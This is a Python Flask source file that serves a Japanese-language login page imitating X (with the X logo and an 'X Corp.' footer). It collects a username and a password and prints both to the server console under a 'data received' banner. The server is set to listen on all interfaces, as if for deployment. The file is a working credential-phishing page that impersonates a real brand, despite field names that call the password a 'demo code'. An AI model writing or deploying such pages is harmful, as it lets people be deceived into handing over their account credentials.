from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>login</title>

<style>

* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        sans-serif;

    background:
        radial-gradient(
            circle at top,
            #17243a 0%,
            #080b10 45%,
            #000000 100%
        );

    color: #ffffff;
}

.container {
    width: 100%;
    max-width: 390px;
    padding: 20px;
}

.card {
    padding: 38px 30px;
    border-radius: 24px;

    background: rgba(255, 255, 255, 0.07);
    border: 1px solid rgba(255, 255, 255, 0.12);

    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);

    box-shadow:
        0 25px 60px rgba(0, 0, 0, 0.45);
}

.logo {
    width: 52px;
    height: 52px;

    margin: 0 auto 24px;

    display: flex;
    justify-content: center;
    align-items: center;

    border-radius: 50%;

    background: #1d9bf0;

    font-size: 25px;
    font-weight: 800;

    box-shadow:
        0 8px 25px rgba(29, 155, 240, 0.35);
}

h1 {
    margin: 0 0 28px;

    text-align: center;

    font-size: 30px;
    font-weight: 700;

    letter-spacing: 1px;
}

.notice {
    margin-bottom: 22px;
    padding: 12px 14px;

    border-radius: 12px;

    background: rgba(255, 255, 255, 0.06);

    color: #aab3bf;

    font-size: 12px;
    line-height: 1.6;

    text-align: center;
}

.input-group {
    margin-bottom: 16px;
}

label {
    display: block;

    margin-bottom: 7px;

    color: #aab3bf;

    font-size: 12px;
}

input {
    width: 100%;

    padding: 14px 15px;

    border: 1px solid rgba(255, 255, 255, 0.14);
    border-radius: 12px;

    outline: none;

    background: rgba(0, 0, 0, 0.28);

    color: #ffffff;

    font-size: 15px;

    transition:
        border-color 0.2s,
        box-shadow 0.2s,
        background 0.2s;
}

input::placeholder {
    color: #68717d;
}

input:focus {
    border-color: #1d9bf0;

    background: rgba(0, 0, 0, 0.4);

    box-shadow:
        0 0 0 3px rgba(29, 155, 240, 0.15);
}
button {
    width: 100%;

    margin-top: 8px;

    padding: 14px;

    border: none;
    border-radius: 999px;

    background: #1d9bf0;

    color: #ffffff;

    font-size: 15px;
    font-weight: 700;

    cursor: pointer;

    transition:
        transform 0.2s,
        background 0.2s,
        box-shadow 0.2s;
}

button:hover {
    background: #1689d8;

    transform: translateY(-2px);

    box-shadow:
        0 8px 25px rgba(29, 155, 240, 0.3);
}

button:active {
    transform: translateY(0);
}

.result {
    margin-top: 22px;

    padding: 16px;

    border-radius: 14px;

    background: rgba(29, 155, 240, 0.10);

    border: 1px solid rgba(29, 155, 240, 0.25);

    text-align: center;

    font-size: 13px;

    line-height: 1.8;
}

.result-title {
    margin-bottom: 8px;

    color: #1d9bf0;

    font-size: 16px;
    font-weight: 700;
}

.footer {
    margin-top: 20px;

    text-align: center;

    color: #59636f;

    font-size: 11px;
}

@media (max-width: 480px) {

    .container {
        padding: 16px;
    }

    .card {
        padding: 32px 22px;
        border-radius: 20px;
    }

    h1 {
        font-size: 27px;
    }
}

</style>
</head>

<body>

<div class="container">

<div class="card">

<div class="logo">
    X
</div>

<h1>X login</h1>

</div>

<form method="POST">

<div class="input-group">

<label>
    ユーザー名
</label>

<input
    type="text"
    name="username"
    placeholder="test123"
    required
>

</div>

<div class="input-group">

<label>
    パスワード
</label>

<input
    type="text"
    name="demo_code"
    maxlength="20"
    placeholder="0000"
    required
>

</div>
<button type="submit">
    送信
</button>

</form>

{% if submitted %}

<div class="result">

<div class="result-title">
    ✓ 送信しました
    
</div>

{% endif %}

<div class="footer">
    ©2026 X Corp.
</div>

</div>

</div>

</body>
</html>
"""


@app.route("/", methods=["GET", "POST"])
def index():

    if request.method == "POST":

        username = request.form.get("username", "")
        demo_code = request.form.get("demo_code", "")

        print("", flush=True)
        print("=== データを受信 ===", flush=True)
        print("Username:", username, flush=True)
        print("Demo Code:", demo_code, flush=True)
        print("========================", flush=True)
        print("", flush=True)

        return render_template_string(
            HTML,
            submitted=True,
            username=username,
            demo_code=demo_code
        )

    return render_template_string(
        HTML,
        submitted=False,
        username="",
        demo_code=""
    )


app.run(
    host="0.0.0.0",
    port=int(os.environ.get("PORT", 10000))
)
